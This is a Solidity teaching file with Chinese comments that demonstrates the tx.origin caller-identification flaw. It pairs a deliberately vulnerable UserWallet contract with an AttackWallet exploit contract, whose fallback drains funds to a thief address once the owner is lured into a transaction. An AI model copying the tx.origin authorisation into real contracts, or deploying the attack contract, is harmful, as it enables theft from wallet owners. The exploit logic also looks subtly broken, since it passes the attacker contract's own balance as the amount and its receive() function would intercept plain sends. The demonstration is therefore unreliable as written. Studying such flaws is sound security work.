// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
   漏洞名稱：Wrong Caller Identification
   描述：在此漏洞中，我們錯誤地使用了 tx.origin 來判斷呼叫者是否為合約擁有者，這可能會被惡意合約利用。惡意合約可以透過中介呼叫 UserWallet.transfer 函式，使得 tx.origin 為真正的錢包擁有者，從而繞過權限檢查。
   攻擊手法：攻擊者部署 AttackWallet，並誘使擁有者對 AttackWallet 進行交易，進而觸發 AttackWallet 的 fallback 函式，該函式呼叫 UserWallet.transfer，從而完成轉帳。

   注意：此版本已修正先前的編譯錯誤，將攻擊廠商中的 userWalletAddr 宣告為 address payable 以符合 Solidity 0.8.0 的要求。
*/

contract UserWallet {
    // 狀態變數：擁有者，漏洞在於使用 tx.origin 來做身份校驗
    address payable public owner;

    // 建構子，部署時指定 owner 並可以接收 Ether
    constructor() payable {
        owner = payable(msg.sender);
    }

    // 漏洞函式：錯誤使用 tx.origin 檢查 caller 身份
    function transfer(address payable dest, uint256 amount) public {
        // 漏洞重點：錯誤使用 tx.origin 判斷權限
        require(tx.origin == owner, "Not owner");
        dest.transfer(amount);
    }

    // 接收 Ether 的 receive 函式
    receive() external payable {}
}

// 攻擊合約：藉由中介呼叫，繞過權限檢查
contract AttackWallet {
    // 將 userWalletAddr 宣告為 address payable 以配合合約類型轉換
    address payable public userWalletAddr;
    address public thiefAddr;

    // 設定 UserWallet 的地址與攻擊者地址
    constructor(address payable _userWalletAddr, address _thiefAddr) {
        userWalletAddr = _userWalletAddr;
        thiefAddr = _thiefAddr;
    }

    // fallback 函式：接收到交易時觸發
    fallback() external payable {
        // 正確將 userWalletAddr 轉型為 UserWallet 合約
        UserWallet w = UserWallet(userWalletAddr);
        // 攻擊點：利用 UserWallet.transfer 的錯誤邏輯，將資金轉到攻擊者地址
        w.transfer(payable(thiefAddr), address(this).balance);
    }

    // 用於接收 Ether
    receive() external payable {}
}
